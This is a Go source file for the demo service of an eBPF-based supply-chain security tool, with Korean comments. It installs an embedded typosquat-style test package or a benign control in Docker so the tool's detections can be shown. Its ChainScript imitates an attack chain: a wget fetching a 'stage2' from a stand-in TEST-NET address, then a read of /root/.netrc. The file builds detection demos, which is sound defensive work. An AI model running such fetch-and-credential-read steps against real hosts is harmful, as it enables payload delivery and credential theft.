// Package demo: 시연 실행(10/30) — 대시보드 「시연」 카드의 GET /api/demo · POST /api/demo/run.
//
// 가젯 소스는 Docker API 로 sg-install-demo-<unix> 컨테이너를 만들고, 임베드한 데모 패키지(reqeusts · 대조군 sg-demo-benign)를 PUT archive 로 올린 뒤
// pip 설치를 돌린다 — sg-install 과 같은 설치 세션 흐름(차단 확인 → 세션 → 끝 보고)이라 화면 · 규칙 · 격리가 그대로 동작한다.
// mock 소스는 컨테이너 없이 같은 세션에 같은 이벤트 순서를 모의 재생한다(simulated). 동시 1개. DEMO_ENABLED=true 일 때만 main 이 만든다.
// 사용자 입력은 시나리오 이름뿐이고 컨테이너 이름 · 이미지 · 명령은 서버가 정한다.
package demo

import (
	"archive/tar"
	"bytes"
	"context"
	"embed"
	"errors"
	"fmt"
	"io"
	"log/slog"
	"slices"
	"strings"
	"sync"
	"time"

	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/dockerapi"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/model"
	"github.com/DevLSJ/ebpf-supplychain-guard/backend/internal/review"
)

// pkgFS: 데모 패키지 사본. 정본은 deploy/demo/<패키지> — TestDemoPackageMirrorsDeploy 가 바이트 동일을 확인한다
//
//go:embed reqeusts/setup.py reqeusts/README.md sg-demo-benign/setup.py sg-demo-benign/README.md sg-demo-benign/sg_demo_benign.py
var pkgFS embed.FS

// 임베드 패키지(디렉터리 이름 = 컨테이너 안 /pkg/<이름> = 세션 패키지 인자 ./<이름>)
const (
	attackPkg = "reqeusts"       // 타이포스쿼팅 흉내(무해 시뮬) — 시나리오 all · shell · revshell · direct-ip · domain · dns-exfil
	benignPkg = "sg-demo-benign" // 정상 설치 대조군(11/04) — 시나리오 benign
)

// PackageFiles: reqeusts 사본 · 정본에 있어야 하는 파일
var PackageFiles = []string{"setup.py", "README.md"}

// packageFiles: 임베드 패키지별 파일 — 사본 · 정본에 있어야 하고 PUT archive 로 올린다
var packageFiles = map[string][]string{
	attackPkg: PackageFiles,
	benignPkg: {"setup.py", "README.md", "sg_demo_benign.py"},
}

// Scenarios: 허용 시나리오(순서는 화면 선택 목록과 같다). 11/04 benign(정상 설치 대조군) · chain(연쇄 규칙)은 끝에 붙는다 — all 에는 들지 않는다
var Scenarios = []string{"all", "shell", "revshell", "direct-ip", "domain", "dns-exfil", "benign", "chain"}

// Run 상태
const (
	StatusRunning  = "running"
	StatusFinished = "finished"
	StatusTimeout  = "timeout"
	StatusFailed   = "failed"
	StatusRefused  = "refused"
)

// ChainScript: chain 시연(11/04) 컨테이너의 셸 본문 — deploy/demo/run-attacker.sh SCENARIO=chain 과 같은 동작(CHAIN_GAP=1 고정, 반복 · 대기 없음).
// 무해: wget 은 TEST-NET(203.0.113.7, 라우팅 안 됨)이라 아무것도 받지 못하고, /root/.netrc 는 없는 파일이라 여는 시도만 한다.
// 연쇄 규칙 chain-download-secrets 의 세 단계(exec wget → 내부망 밖 connect → open 자격 증명 경로)를 1~4초 안에 차례로 낸다.
// TEST-NET 연결은 실패할 때(약 3초 뒤) connect 이벤트가 나오므로 파일 열기는 그 뒤 1초에 둔다(순서가 뒤집히지 않게)
const ChainScript = `echo "[demo] chain start"
timeout 3 wget -q -O /dev/null http://203.0.113.7/stage2 || true
sleep 1
cat /root/.netrc >/dev/null 2>&1 || true
echo "[demo] chain done"`

const (
	DefaultImage = "python:3.12-slim"
	// DefaultChainImage: chain 시연 이미지 — wget · timeout · sleep · cat 이 든 busybox(run-attacker.sh 와 같은 계열, 태그 고정)
	DefaultChainImage = "busybox:1.36"
	DefaultTimeout    = 90 * time.Second
	manager           = "pip"
	pkgRoot           = "/pkg/"            // PUT archive 로 올린 패키지 위치 /pkg/<패키지>
	demoLabel         = "supplyguard.demo" // 컨테이너 라벨 supplyguard.demo=install
	exitKilled        = 137                // SIGKILL 로 격리된 컨테이너(mock 재생이 kill 로 끝났을 때)
	exitTimeout       = 124                // 시간 초과(timeout(1) 관례)
	exitFailed        = -1                 // 컨테이너를 만들거나 띄우지 못함
	createTimeout     = 3 * time.Minute    // 이미지 pull 포함
	stepTimeout       = 30 * time.Second   // archive · start · remove · finish
)

// Run: 시연 실행 1건 — GET /api/demo 의 running · last, POST 의 202 본문
type Run struct {
	ID         string     `json:"id"`        // demo-<unix>
	Scenario   string     `json:"scenario"`  // all | shell | revshell | direct-ip | domain | dns-exfil | benign | chain
	Container  string     `json:"container"` // sg-install-demo-<unix>
	InstallID  string     `json:"installId"`
	StartedAt  time.Time  `json:"startedAt"`
	FinishedAt *time.Time `json:"finishedAt"`
	Status     string     `json:"status"`   // running | finished | timeout | failed | refused
	ExitCode   *int       `json:"exitCode"` // 끝나기 전엔 null
	Simulated  bool       `json:"simulated"`
	// Explain: 「왜」 보충(11/04) — GET /api/demo 가 읽을 때 세션 · 정책으로 채운다(explain.go). POST 본문 · 409 · 거부(refused)에는 없다
	Explain *Explain `json:"explain,omitempty"`
}

// Status: GET /api/demo
type Status struct {
	Enabled   bool     `json:"enabled"`
	Scenarios []string `json:"scenarios"`
	Running   *Run     `json:"running"`
	Last      *Run     `json:"last"`
}

var (
	// ErrScenario: 400
	ErrScenario = errors.New("scenario: " + strings.Join(Scenarios, " | "))
	// ErrDocker: 503 — 가젯 소스에서 Docker 데몬에 닿지 못함(세션을 만들기 전에 확인한다)
	ErrDocker = errors.New("Docker 에 연결할 수 없습니다")
	// ErrClosed: 503 — 서버 종료 중(Shutdown 뒤에는 새 시연을 받지 않는다)
	ErrClosed = errors.New("서버가 종료 중입니다")
)

// RunningError: 409 — 이미 실행 중. 진행 중인 Run 을 함께 돌려준다
type RunningError struct{ Running Run }

func (e *RunningError) Error() string { return "시연이 이미 실행 중입니다" }

// Review: review.Service 중 쓰는 것 — sg-install 의 POST /api/installs · PUT finish · POST refused 와 같은 호출
type Review interface {
	CheckPackage(manager, pkg string) (review.CheckResult, error)
	StartInstall(ctx context.Context, in review.StartInput) (model.InstallSession, error)
	FinishInstall(ctx context.Context, id string, exitCode int) (model.InstallSession, error)
	RefusedInstall(ctx context.Context, in review.RefusedInput) (model.InstallSession, error)
	RecordChange(ctx context.Context, kind model.ChangeKind, summary string) error
}

// Docker: dockerapi.Client 중 쓰는 것 (Tier 1 — 컨테이너 생성 · 기동)
type Docker interface {
	Ping(ctx context.Context) error
	CreateContainer(ctx context.Context, s dockerapi.CreateSpec) (string, error)
	PutArchive(ctx context.Context, id, path string, r io.Reader) error
	StartContainer(ctx context.Context, id string) error
	WaitContainer(ctx context.Context, id string) (int, error)
	RemoveContainer(ctx context.Context, id string, force bool) error
}

// Simulator: mock 소스(ingestion.Mock) — 컨테이너 없이 세션의 이벤트를 재생하고 끝나면(또는 kill 되면) 돌아온다
type Simulator interface {
	PlayDemo(ctx context.Context, s model.InstallSession, scenario string) (killed bool)
}

type Options struct {
	Review Review
	// Docker: 가젯 소스. Simulator 가 있으면 쓰지 않는다
	Docker Docker
	// Simulator: mock 소스 — 있으면 컨테이너 없이 재생(Run.simulated = true)
	Simulator Simulator
	// Image: 시연 컨테이너 이미지 (SG_PIP_IMAGE, 기본 python:3.12-slim)
	Image string
	// ChainImage: chain 시연 이미지 (기본 busybox:1.36)
	ChainImage string
	// Timeout: 컨테이너(또는 재생) 종료 대기 상한 (기본 90초)
	Timeout time.Duration
	Now     func() time.Time
}

type Service struct {
	o       Options
	mu      sync.Mutex
	running *Run
	last    *Run
	lastID  int64 // 마지막으로 쓴 <unix> — 같은 초에 다시 실행해도 이름이 겹치지 않게
	wg      sync.WaitGroup
	// ctx: 실행 고루틴의 부모 — Shutdown 이 취소해 대기 중인 컨테이너를 곧바로 멈추고 지운다(11/02)
	ctx    context.Context
	stop   context.CancelFunc
	closed bool
}

func New(o Options) *Service {
	if o.Image == "" {
		o.Image = DefaultImage
	}
	if o.ChainImage == "" {
		o.ChainImage = DefaultChainImage
	}
	if o.Timeout <= 0 {
		o.Timeout = DefaultTimeout
	}
	if o.Now == nil {
		o.Now = func() time.Time { return time.Now().UTC() }
	}
	ctx, stop := context.WithCancel(context.Background())
	return &Service{o: o, ctx: ctx, stop: stop}
}

func ValidScenario(s string) bool { return slices.Contains(Scenarios, s) }

// plan: 시나리오가 정하는 실행 — 세션 패키지 인자 · 임베드 패키지 · 이미지 · 명령 · 환경. 모두 서버 상수(사용자 입력 아님)
type plan struct {
	pkgArg string   // 세션 패키지 인자 — 라벨 「pip ./<패키지>」 · 차단 확인 키 pip:<패키지> (sg-install pip ./deploy/demo/<패키지> 와 같다)
	pkgDir string   // PUT archive 로 올릴 임베드 패키지 — 비면 올리지 않는다(chain)
	image  string   // 컨테이너 이미지
	cmd    []string // 컨테이너 명령
	env    []string
}

func (s *Service) planFor(scenario string) plan {
	if scenario == "chain" {
		// 연쇄 규칙 시연: pip 설치가 아니라 reqeusts 가 깔린 뒤 런타임에 하는 짓을 busybox 셸로 재현한다(run-attacker.sh SCENARIO=chain).
		// 세션 패키지는 reqeusts 그대로 — 차단 목록에 있으면 다른 공격 시나리오처럼 거부된다
		return plan{pkgArg: "./" + attackPkg, image: s.o.ChainImage, cmd: []string{"sh", "-c", ChainScript}}
	}
	if scenario == "benign" {
		// 정상 설치 대조군: 공격 패키지와 다른 패키지라 pip:reqeusts 차단과 상관없이 돈다. 시나리오 환경 변수는 없다
		return plan{pkgArg: "./" + benignPkg, pkgDir: benignPkg, image: s.o.Image, cmd: pipInstall(benignPkg),
			env: []string{"PIP_DISABLE_PIP_VERSION_CHECK=1"}}
	}
	return plan{pkgArg: "./" + attackPkg, pkgDir: attackPkg, image: s.o.Image, cmd: pipInstall(attackPkg),
		env: []string{"SG_DEMO_SCENARIOS=" + scenario, "PIP_DISABLE_PIP_VERSION_CHECK=1"}}
}

func pipInstall(pkg string) []string {
	return []string{"pip", "install", "--no-cache-dir", "--progress-bar", "off", pkgRoot + pkg}
}

// Status: 진행 중 · 마지막 실행 (사본)
func (s *Service) Status() Status {
	s.mu.Lock()
	defer s.mu.Unlock()
	return Status{Enabled: true, Scenarios: slices.Clone(Scenarios), Running: s.running.clone(), Last: s.last.clone()}
}

func (r *Run) clone() *Run {
	if r == nil {
		return nil
	}
	c := *r
	c.Explain = nil // 읽을 때 계산하는 값 — 서비스 상태에는 두지 않는다
	if r.FinishedAt != nil {
		t := *r.FinishedAt
		c.FinishedAt = &t
	}
	if r.ExitCode != nil {
		n := *r.ExitCode
		c.ExitCode = &n
	}
	return &c
}

// Wait: 진행 중인 실행이 끝날 때까지 (테스트용)
func (s *Service) Wait() { s.wg.Wait() }

// Shutdown: 서버 종료 때 부른다(11/02). 새 시연을 막고, 진행 중인 실행의 대기를 취소해
// 컨테이너를 강제 제거 · 세션을 failed 로 닫은 뒤 돌아온다. ctx 가 먼저 끝나면 ctx.Err()
func (s *Service) Shutdown(ctx context.Context) error {
	s.mu.Lock()
	s.closed = true
	s.mu.Unlock()
	s.stop()
	done := make(chan struct{})
	go func() { s.wg.Wait(); close(done) }()
	select {
	case <-done:
		return nil
	case <-ctx.Done():
		return ctx.Err()
	}
}

// Start: ① 차단 목록(시나리오의 패키지 — pip:reqeusts · pip:sg-demo-benign — 가 막혀 있으면 거부 세션 · status refused) ② Docker 연결 확인(가젯) ③ 설치 세션(demo)
// ④ 변경 이력 demo_run ⑤ 뒤에서 컨테이너 생성 → 패키지 업로드 → 시작 → 종료 대기 → 세션 finish → 제거(또는 mock 재생).
// 동시 1개 — 실행 중이면 *RunningError.
func (s *Service) Start(ctx context.Context, scenario string) (Run, error) {
	if !ValidScenario(scenario) {
		return Run{}, ErrScenario
	}
	if s.o.Simulator == nil && s.o.Docker == nil {
		return Run{}, errors.New("demo: Docker 도 Simulator 도 없음")
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.closed {
		return Run{}, ErrClosed
	}
	if s.running != nil {
		return Run{}, &RunningError{Running: *s.running.clone()}
	}
	now := s.o.Now()
	unix := max(now.Unix(), s.lastID+1)
	run := Run{ID: fmt.Sprintf("demo-%d", unix), Scenario: scenario, Container: fmt.Sprintf("sg-install-demo-%d", unix),
		StartedAt: now, Status: StatusRunning, Simulated: s.o.Simulator != nil}
	p := s.planFor(scenario)

	chk, err := s.o.Review.CheckPackage(manager, p.pkgArg)
	if err != nil {
		return Run{}, err
	}
	if chk.Blocked {
		// sg-install 처럼 컨테이너 없이 거부 세션만 남긴다 — 화면은 「차단 목록에 있어 설치 전 거부됨 — 차단 해제 후 다시」
		sess, err := s.o.Review.RefusedInstall(ctx, review.RefusedInput{Manager: manager, Packages: []string{p.pkgArg}, Value: chk.Value, Demo: true})
		if err != nil {
			return Run{}, err
		}
		s.lastID = unix
		code := 0
		run.InstallID, run.Status, run.FinishedAt, run.ExitCode = sess.ID, StatusRefused, &now, &code
		s.last = run.clone()
		s.record(ctx, scenario)
		return run, nil
	}
	if s.o.Simulator == nil {
		if err := s.o.Docker.Ping(ctx); err != nil {
			return Run{}, fmt.Errorf("%w: %v", ErrDocker, err)
		}
	}
	sess, err := s.o.Review.StartInstall(ctx, review.StartInput{Manager: manager, Packages: []string{p.pkgArg}, Container: run.Container, Image: p.image, Demo: true})
	if err != nil {
		return Run{}, err
	}
	s.lastID = unix
	run.InstallID = sess.ID
	s.running = run.clone()
	s.record(ctx, scenario)
	s.wg.Add(1)
	go s.execute(run, sess)
	return run, nil
}

// record: 변경 이력 「시연 실행: <scenario>」 — 처리자는 요청자(로그인 계정 표시 이름)
func (s *Service) record(ctx context.Context, scenario string) {
	if err := s.o.Review.RecordChange(ctx, model.ChangeDemoRun, "시연 실행: "+scenario); err != nil {
		slog.Warn("demo: change record", "err", err)
	}
}

// execute: 뒤에서 도는 실행 본체. 요청 ctx 와 떼고 서비스 ctx(Shutdown 이 취소)로 돈다.
// panic 은 여기서 거둬 서버를 죽이지 않는다 — 컨테이너는 defer 로 강제 제거, Run · 세션은 failed 로 닫는다(11/02)
func (s *Service) execute(run Run, sess model.InstallSession) {
	defer s.wg.Done()
	ended := false
	end := func(status string, code int) {
		if !ended {
			ended = true
			s.finish(run, status, code)
		}
	}
	defer func() {
		if r := recover(); r != nil {
			slog.Error("demo: run panicked", "container", run.Container, "panic", r)
			end(StatusFailed, exitFailed)
		}
	}()
	ctx := s.ctx
	if s.o.Simulator != nil {
		pctx, cancel := context.WithTimeout(ctx, s.o.Timeout)
		defer cancel()
		killed := s.o.Simulator.PlayDemo(pctx, sess, run.Scenario)
		code := 0
		if killed {
			code = exitKilled
		}
		end(StatusFinished, code)
		return
	}
	p := s.planFor(run.Scenario)
	cctx, cancel := context.WithTimeout(ctx, createTimeout)
	cid, err := s.o.Docker.CreateContainer(cctx, dockerapi.CreateSpec{
		Name: run.Container, Image: p.image, Cmd: p.cmd, Env: p.env,
		Labels: map[string]string{demoLabel: "install"},
	})
	cancel()
	if err != nil {
		slog.Error("demo: create container", "container", run.Container, "err", err)
		end(StatusFailed, exitFailed)
		return
	}
	// 만든 뒤에는 어떤 경로(실패 · 시간 초과 · 종료 · panic)로 끝나도 지운다 — 격리된 경우 enforcer 가 이미 죽였어도(force).
	// 서비스 ctx 가 취소된 뒤에도 지워야 하므로 Background 에서 단계 상한만 건다
	defer func() {
		rctx, cancel := context.WithTimeout(context.Background(), stepTimeout)
		defer cancel()
		if err := s.o.Docker.RemoveContainer(rctx, cid, true); err != nil {
			slog.Warn("demo: remove container", "container", run.Container, "err", err)
		}
	}()
	step := func(name string, fn func(context.Context) error) bool {
		sctx, cancel := context.WithTimeout(ctx, stepTimeout)
		defer cancel()
		if err := fn(sctx); err != nil {
			slog.Error("demo: "+name, "container", run.Container, "err", err)
			return false
		}
		return true
	}
	var tarb []byte
	if p.pkgDir != "" {
		if tarb, err = archivePackage(p.pkgDir); err != nil {
			slog.Error("demo: package archive", "err", err)
			end(StatusFailed, exitFailed)
			return
		}
	}
	// 시작 전에 패키지를 컨테이너 안 /pkg/<패키지> 로 올린다 — 호스트 경로 의존 없음. tar 는 pkg/<패키지>/… 라 '/' 에 푼다. 패키지가 없는 시나리오(chain)는 건너뛴다
	if (tarb != nil && !step("put archive", func(c context.Context) error { return s.o.Docker.PutArchive(c, cid, "/", bytes.NewReader(tarb)) })) ||
		!step("start container", func(c context.Context) error { return s.o.Docker.StartContainer(c, cid) }) {
		end(StatusFailed, exitFailed)
		return
	}
	wctx, cancel := context.WithTimeout(ctx, s.o.Timeout)
	defer cancel()
	code, err := s.o.Docker.WaitContainer(wctx, cid)
	switch {
	case ctx.Err() != nil:
		slog.Warn("demo: server shutting down; removing container", "container", run.Container)
		end(StatusFailed, exitFailed)
	case wctx.Err() != nil:
		slog.Warn("demo: container did not finish in time; killing", "container", run.Container, "timeout", s.o.Timeout)
		end(StatusTimeout, exitTimeout)
	case err != nil:
		slog.Error("demo: wait container", "container", run.Container, "err", err)
		end(StatusFailed, exitFailed)
	default:
		end(StatusFinished, code)
	}
}

// finish: 세션 끝 보고(exit code) 뒤 Run 을 끝낸다
func (s *Service) finish(run Run, status string, code int) {
	fctx, cancel := context.WithTimeout(context.Background(), stepTimeout)
	defer cancel()
	if _, err := s.o.Review.FinishInstall(fctx, run.InstallID, code); err != nil {
		slog.Warn("demo: finish install", "install", run.InstallID, "err", err)
	}
	now := s.o.Now()
	s.mu.Lock()
	defer s.mu.Unlock()
	run.FinishedAt, run.Status, run.ExitCode = &now, status, &code
	s.last = run.clone()
	s.running = nil
}

// Archive: PUT /containers/{id}/archive 용 tar — pkg/reqeusts/{setup.py,README.md} (컨테이너 '/' 에 풀면 /pkg/reqeusts)
func Archive() ([]byte, error) { return archivePackage(attackPkg) }

// archivePackage: 임베드 패키지 하나의 tar — pkg/<pkg>/<파일> (컨테이너 '/' 에 풀면 /pkg/<pkg>)
func archivePackage(pkg string) ([]byte, error) {
	files, ok := packageFiles[pkg]
	if !ok {
		return nil, fmt.Errorf("demo: unknown package %q", pkg)
	}
	var buf bytes.Buffer
	tw := tar.NewWriter(&buf)
	mod := time.Date(2026, 10, 30, 0, 0, 0, 0, time.UTC)
	for _, d := range []string{"pkg/", "pkg/" + pkg + "/"} {
		if err := tw.WriteHeader(&tar.Header{Typeflag: tar.TypeDir, Name: d, Mode: 0o755, ModTime: mod}); err != nil {
			return nil, err
		}
	}
	for _, name := range files {
		b, err := pkgFS.ReadFile(pkg + "/" + name)
		if err != nil {
			return nil, err
		}
		if err := tw.WriteHeader(&tar.Header{Typeflag: tar.TypeReg, Name: "pkg/" + pkg + "/" + name, Mode: 0o644, Size: int64(len(b)), ModTime: mod}); err != nil {
			return nil, err
		}
		if _, err := tw.Write(b); err != nil {
			return nil, err
		}
	}
	if err := tw.Close(); err != nil {
		return nil, err
	}
	return buf.Bytes(), nil
}
